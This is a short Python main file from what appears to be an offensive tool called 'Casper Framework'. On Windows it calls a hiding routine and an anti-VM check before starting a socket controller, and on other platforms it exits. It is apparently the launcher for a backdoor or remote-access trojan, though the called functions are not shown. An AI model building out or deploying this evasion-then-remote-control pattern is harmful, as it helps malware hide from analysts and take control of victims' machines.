"""
Part of Casper Framework
"""
from framework.includes import *

__author__ = "rootm0s"
__version__ = "0.1"

logging.debug("[casper] Teh n0t s0 fr13ndly gh0st!")

def main():
	try:
		if (sys.platform.lower().find("win") == 0):
			# set hidden to 0 to disable the function
			if (hidden(1) == True):
				# set antivm to 0 to disable the function
				if (antivm(1) == True):
					socket_control()
				else:
					sys.exit()
			else:
				sys.exit()
		elif (sys.platform.lower().find("posix") == 0):
			sys.exit()
		elif (sys.platform.lower().find("dar") == 0):
			sys.exit()
		elif (sys.platform.lower().find("lin") == 0):
			sys.exit()
	except Exception as e:
		sys.exit()

if __name__ == "__main__":
	main()